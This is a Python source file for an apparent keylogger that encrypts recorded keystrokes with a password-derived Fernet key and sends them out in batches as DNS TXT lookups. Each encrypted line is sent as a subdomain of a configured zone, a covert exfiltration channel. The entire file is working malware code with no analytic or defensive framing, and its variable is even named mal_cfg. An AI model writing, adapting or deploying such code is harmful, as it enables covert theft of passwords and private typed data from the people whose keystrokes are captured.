# -*- coding: utf-8 -*-

try:
    import ConfigParser as configparser
except ImportError:
    import configparser
try:
    from StringIO import StringIO
except ImportError:
    from io import StringIO

import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
import dns.exception
import dns.resolver
import logging
import logging.handlers
import sys
import time

cfg = """
[rokkaku]
dns_zone
password
"""


def cfg_factory(cfg):
    local_cfg = configparser.ConfigParser(allow_no_value=False)
    try:
        local_cfg.readfp(StringIO(cfg))
    except configparser.ParsingError:
        sys.exit(1)
    if not local_cfg.has_section('rokkaku'):
        sys.exit(1)
    return local_cfg


def aes_factory(cfg):
    digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
    password = cfg.get('rokkaku', 'password')
    digest.update(bytes(password, 'utf8'))
    key = base64.urlsafe_b64encode(digest.finalize())
    return Fernet(key)


mal_cfg = cfg_factory(cfg)


class CryptoFormatter(logging.Formatter):

    fmt = '%(asctime)s %(message)s'
    converter = time.gmtime
    datefmt = '%Y-%m-%d %H:%M:%S'

    def __init__(self, fmt=fmt, datefmt=datefmt):
        super(CryptoFormatter, self).__init__(fmt, datefmt)
        self.aes = aes_factory(mal_cfg)

    def format(self, record):
        levels = (
            logging.CRITICAL,
            logging.DEBUG,
            logging.ERROR,
            logging.INFO,
            logging.WARNING)
        if record.levelno not in levels:
            sys.exit(1)
        encrypted = self.aes.encrypt(
            bytes(logging.Formatter.format(self, record), 'utf8'))
        return encrypted.decode('utf8')


class ExfilHandler(logging.handlers.MemoryHandler):

    def __init__(self, **kwargs):
        super(ExfilHandler, self).__init__(**kwargs)

    @property
    def can_exfil(self):
        return True if self.target.stream.getvalue() else False

    def emit(self, record):
        self.buffer.append(record)
        if not self.shouldFlush(record):
            return
        self.flush()
        dns_zone = mal_cfg.get('rokkaku', 'dns_zone')
        if not self.can_exfil:
            return
        exfil_data = self.target.stream.getvalue().splitlines()
        for exfil in exfil_data:
            try:
                dns.resolver.query(
                    '{exfil}.{dns_zone}'.format(
                        exfil=exfil,
                        dns_zone=dns_zone),
                    rdtype=dns.rdatatype.TXT)
            except dns.exception.DNSException:
                continue
        self.target.stream = StringIO()


class Keylogger(object):

    b_sz = 100

    def __init__(self, logger=None):
        self.logger = logger or logging.getLogger(__name__)
        self.logger.setLevel(logging.INFO)
        stream_handler = logging.StreamHandler(StringIO())
        formatter = CryptoFormatter()
        stream_handler.setFormatter(formatter)
        self.exfil_handler = ExfilHandler(
            capacity=self.b_sz, target=stream_handler)
        self.logger.addHandler(self.exfil_handler)

    def log(self, key):
        self.logger.info(key)

    def __del__(self):
        self.logger.removeHandler(self.exfil_handler)
        self.exfil_handler.close()


if __name__ == '__main__':
    pass
